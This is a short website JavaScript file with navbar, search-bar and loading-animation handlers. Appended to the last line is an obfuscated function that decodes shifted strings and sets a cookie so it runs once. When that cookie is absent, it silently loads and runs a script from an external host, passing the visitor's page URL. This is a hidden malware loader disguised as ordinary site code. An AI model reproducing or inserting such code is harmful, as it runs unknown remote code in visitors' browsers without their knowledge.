let navbar=document.querySelector(".navbar");

document.querySelector("#menu-btn").onclick=()=>{navbar.classList.toggle("active")};

let searchbar=document.querySelector(".searchbar");

function startLoading(){document.querySelector(".startline").style.animationPlayState="running"}
function stopLoading(){document.querySelector(".startline").style.animationPlayState="paused"}

document.querySelector("#search").onclick=()=>{searchbar.classList.toggle("active")};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));